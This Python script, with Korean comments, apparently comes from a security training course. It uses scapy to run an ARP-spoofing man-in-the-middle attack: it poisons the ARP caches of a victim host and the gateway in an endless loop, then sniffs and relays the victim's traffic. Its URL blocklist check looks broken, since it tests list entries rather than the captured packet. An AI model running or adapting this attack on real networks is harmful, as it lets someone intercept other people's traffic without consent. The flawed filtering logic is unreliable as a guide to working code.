# -*- coding: utf-8 -*-

"""
  저번에는 운영체제 환경과 scapy 버전이 안 맞아서 되지 않았었는데
  패킷통합 이라는 정책을 풀어주고 scapy 버전을 업그레이드 하니까
  이 코드가 정상적으로 돌아갔습니다. 그래서 이 코드를 그대로 쓰고
  정규표현식을 써서 간단히 mal_site.txt 에 있는 url 을 탐지해주었습니다.
"""

import sys
import scapy
import socket
import subprocess, shlex
import uuid
import re
import threading
import time
from scapy.sendrecv import sendp, sniff, srp
from scapy.all import *
from scapy.layers import http


def main():
	global gatewayip
	global victimip
	global attackip

	global gatewaymac
	global victimmac
	global attackmac

	#	global lock
	#	lock = thread.allocate_lock()

	gatewayip, attackip = get_if()  # 인터페이스 파싱
	victimip = sys.argv[1]

	gatewaymac = get_mac(gatewayip)  # 맥주소 얻어오기
	victimmac = get_mac(victimip)
	attackmac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

	print("============================\n")
	print("Attack IP , MAC : %s + %s\n" % (attackip, attackmac))
	print("Victim IP , MAC : %s + %s\n" % (victimip, victimmac))
	print("Gateway IP , MAC : %s + %s\n" % (gatewayip, gatewaymac))
	print("============================\n")

	thread.start_new_thread(spoof, ())
	sniff(count=0, prn=relay)


def spoof():
	while (1):
		send(ARP(op=2, psrc=gatewayip, pdst=victimip, hwdst=victimmac, hwsrc=attackmac))
		print("Attack packet!!!")
		send(ARP(op=2, psrc=victimip, pdst=gatewayip, hwdst=gatewaymac, hwsrc=attackmac))
		print("Attack packet_back!!!")
		time.sleep(1)


def relay(p):

	if (p.haslayer(IP) <= 0):
		return

	if not p.haslayer(http.HTTPRequest):
		http_packet = p.getlayer(http.HTTPRequest)
		if(url_check(http_packet)):
			return
	# ip packet 이면
	if p.haslayer(IP):
		print ("test1")
		# victim 이 send 를 하려고 할 때 relay 과정
		if ((p[IP].src == victimip) and (p[Ether].src == victimmac) and (p[Ether].dst == attackmac)):
			p[Ether].src = attackmac
			p[Ether].dst = gatewaymac
			p = del_section(p)
			sendp(fragment(p, 1024))  # relay
		# victim 이 recv 를 했을 때 relay 과정
		elif (p[IP].dst == victimip and p[Ether].src == gatewaymac and p[Ether].dst == attackmac):
			p[Ether].src = attackmac
			p[Ether].dst = victimmac
			p = del_section(p)
			sendp(fragment(p, 1024))  # relay


def get_if():
	strs = subprocess.check_output(shlex.split('ip r l'))
	match_string = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
	ip = re.search('src ' + match_string, strs).group(1)
	gateway = re.search('default via ' + match_string, strs).group(1)
	return gateway, ip


def get_mac(ip_address):
	res, un = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_address), timeout=2, retry=10)
	for s, r in res:
		return r[Ether].src
	return None

def url_check(http_packet):
	url_pattern = "(http|https):\/\/(([\xA1-\xFEa-z0-9_\-]+\.[\xA1-\xFEa-z0-9:;&#@=_~%\?\/\.\,\+\-]+))"
	with open("/home/whitehacker/bob5/imsi3/mal_site.txt", 'r') as f:
		danger_url = f.read().splitlines()
		for i in range(0, len(danger_url)):
			if (bool(re.search(url_pattern, danger_url[i]))):
				return 1

"""
	밑에 있는 코드는 BOB 5기 김홍교 학우한테 배웠습니다.
	DNS 패킷이 잡히는데 계속 릴레이를 못해줘서 문제를 물어봤는데
	UDP 패킷은 잘려서 못 받아온다고 합니다.
"""

def del_section(packet):
	if (packet.haslayer(UDP)):
		del packet[UDP].chksum
		del packet[UDP].len
		del packet.chksum
		del packet.len
		return packet

	elif (packet.haslayer(TCP)):
		del packet[TCP].chksum
		del packet.chksum
		del packet.len
		return packet

	elif (packet.haslayer(ICMP)):
		del packet[ICMP].chksum
		del packet.chksum
		del packet.len
		return packet

	else:
		return packet


if __name__ == "__main__":
	main()
